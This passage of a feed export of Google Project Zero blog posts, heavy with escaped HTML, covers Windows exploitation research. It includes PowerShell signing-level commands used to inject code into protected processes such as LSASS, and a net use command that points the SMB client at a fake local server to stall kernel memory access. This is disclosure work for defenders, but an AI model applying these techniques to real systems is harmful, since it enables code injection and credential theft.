ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;........@.......&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00000020:&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;................&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00000030:&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;B8&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;................&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c7 ROKGfcMygP-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; Set-NtCachedSigningLevel $path&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-Flags&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0x804&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-SigningLevel&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;12 -Win32Path&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Get-NtCachedSigningLevel&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-Win32Path&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;TrustedSignature&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;SigningLevel&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Windows&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Thumbprint&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;B9590CE5B1B3F377EAA6F455574C977919BB785F12A444BEB2...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;ThumbprintBytes&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;{185,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;89,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;12,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;229...}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;ThumbprintAlgorithm&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Sha256&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;span&gt;&lt;span&gt;Thus to exploit on Windows 11 24H2 we can swap the type library registration path from the 64 bit version to the 32 bit version and rerun the exploit. The &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;VerifyTrust&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;function will automatically set the cached signing level for us so we don&amp;#39;t need to do anything to make it work. Even though it&amp;#39;s technically a different version of the type library, it doesn&amp;#39;t make any difference for our use case and the stub generator code doesn&amp;#39;t care.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ROKGfcMygP-c11&quot; id=&quot;h.7oxgkje1u47z&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c7 ROKGfcMygP-c15&quot;&gt;Conclusions&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;I discussed in this blog post an interesting type of bug class on Windows, although it is applicable to any similar object-orientated remoting cross process or remoting protocol. It shows how you can get a COM object trapped in a more privileged process by exploiting a feature of OLE Automation, specifically the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;IDispatch&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;interface and type libraries.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;While I wasn&amp;#39;t able to demonstrate a privilege escalation, I showed how you can use the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;IDispatch&lt;/span&gt;&lt;span&gt;&amp;nbsp;interface exposed by the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;WaaSRemediationAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;class to inject code into a PPL-Windows process. While this isn&amp;#39;t the highest possible protection l&lt;/span&gt;&lt;span&gt;evel&lt;/span&gt;&lt;span&gt;&amp;nbsp;it allows access to the majority of processes running protected including LSASS. We saw that Microsoft has done some work to try and mitigate existing attacks such as type library type-confusions, but in our case this mitigation shouldn&amp;#39;t have blocked the load as we didn&amp;#39;t need to change the type library itself. While the attack required admin privilege, the general technique does not. You could modify the local user&amp;#39;s registration for COM and .NET to do the attack as a normal user to inject into a PPL if you can find a suitable COM server exposing &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;IDispatch&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;.&lt;/span&gt;&lt;/p&gt;</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/8871156912918818192/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2025/01/windows-bug-class-accessing-trapped-com.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/8871156912918818192'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/8871156912918818192'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2025/01/windows-bug-class-accessing-trapped-com.html' title='Windows Bug Class: Accessing Trapped COM Objects with IDispatch'/><author><name>Google Project Zero</name><uri>http://www.blogger.com/profile/08975904405228580347</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-4838136820032157985.post-5888159695536073518</id><published>2025-01-30T09:57:00.000-08:00</published><updated>2025-01-30T09:57:37.322-08:00</updated><title type='text'>Windows Exploitation Tricks: Trapping Virtual Memory Access (2025 Update)</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;@import url(https://themes.googleusercontent.com/fonts/css?kit=XGMkxXUZTA64h2imyzu79g);ol{margin:0;padding:0}table td,table th{padding:0}.eIXINtTAni-c7{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:&quot;Arial&quot;;font-style:normal}.eIXINtTAni-c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;;font-style:normal}.eIXINtTAni-c1{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.eIXINtTAni-c6{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;;font-style:normal}.eIXINtTAni-c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.eIXINtTAni-c4{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.eIXINtTAni-c8{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.eIXINtTAni-c5{color:#188038;font-weight:400;font-family:&quot;Roboto Mono&quot;}.eIXINtTAni-c3{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;c8 doc-content&quot;&gt;
 &lt;p class=&quot;eIXINtTAni-c0&quot;&gt;&lt;span class=&quot;eIXINtTAni-c6&quot;&gt;Posted by James Forshaw, Google Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0 eIXINtTAni-c3&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0&quot;&gt;&lt;span&gt;Back in 2021 I wrote a &lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c4&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&amp;nbsp;about various ways you can build a virtual memory access trap primitive on Windows. The goal was to cause a reader or writer of a virtual memory address to halt for a significant (e.g. 1 or more seconds) amount of time, generally for the purpose of exploiting TOCTOU memory access bugs in the kernel.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0 eIXINtTAni-c3&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0&quot;&gt;&lt;span&gt;The solutions proposed in the blog post were to either map an SMB file on a remote server, or abuse the Cloud Filter API. This blog isn&amp;#39;t going to provide new solutions, instead I wanted to highlight a new feature of Windows 11 24H2 that introduces the ability to abuse the SMB file server directly on the local machine, no remote server required. This change also introduces the ability to locally exploit vulnerabilities which are of the so-called &amp;quot;&lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c4&quot;&gt;&lt;a href=&quot;https://www.elastic.co/security-labs/false-file-immutability&quot;&gt;False File Immutability&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&amp;quot; bug class.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;eIXINtTAni-c1&quot; id=&quot;h.dvhat7v9e1zh&quot;&gt;&lt;span class=&quot;eIXINtTAni-c7&quot;&gt;All Change Please&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;eIXINtTAni-c0&quot;&gt;&lt;span&gt;The change was first made public, at least as far as I know, in &lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c4&quot;&gt;&lt;a href=&quot;https://techcommunity.microsoft.com/blog/filecab/smb-alternative-ports-now-supported-in-windows-insider/3974509&quot;&gt;this blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;. Microsoft&amp;#39;s blog post described this change in Windows Insider previews, however it has subsequently shipped in Windows 11 24H2 which is generally available. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0 eIXINtTAni-c3&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0&quot;&gt;&lt;span&gt;The TL;DR; is the SMB client on Windows now supports specifying the destination TCP port from the command line&amp;#39;s &lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c5&quot;&gt;net&lt;/span&gt;&lt;span&gt;&amp;nbsp;command. For example, you can force the SMB client to use port 12345 through the command &lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c5&quot;&gt;net use \\localhost\c$ /TCPPORT:12345&lt;/span&gt;&lt;span&gt;. Now accessing the UNC path &lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c5&quot;&gt;\\localhost\c$\blah&lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&amp;nbsp;will connect through port 12345 instead of the old, fixed port of 445. This feature works from any user, administrator access is not required as it only affects the current user&amp;#39;s logon session.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0 eIXINtTAni-c3&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;The problem encountered in the previous blog post was you couldn&amp;#39;t bind your fake SMB server to port 445 without shutting down the local SMB server. Shutting down the server can only be done as an administrator, defeating most of the point of the exploitation trick. By changing the client port to one which isn&amp;#39;t currently in use, we can open files via our fake SMB server and perform the delay locally without needing to use the Cloud Filter API. This still won&amp;#39;t allow the technique to work in a sandbox fortunately.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0 eIXINtTAni-c3&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;Note, that an administrator can disable this feature through Group Policy, but it is enabled by default and non-enterprise users are never likely to change that. I personally think making it enabled by default is a mistake that will come back to cause problems for Windows going forward.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0 eIXINtTAni-c3&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0&quot;&gt;&lt;span&gt;I&amp;#39;ve &lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c4&quot;&gt;&lt;a href=&quot;https://github.com/tyranid/windows-memory-access-traps&quot;&gt;updated the example fake SMB server&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&amp;nbsp;to allow you to bind to a different port so that you can perform the attack locally. Hopefully someone finds it useful.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0 eIXINtTAni-c3&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;eIXINtTAni-c0 eIXINtTAni-c3&quot;&gt;&lt;span class=&quot;eIXINtTAni-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/5888159695536073518/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2025/01/windows-exploitation-tricks-trapping.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/5888159695536073518'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/5888159695536073518'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2025/01/windows-exploitation-tricks-trapping.html' title='Windows Exploitation 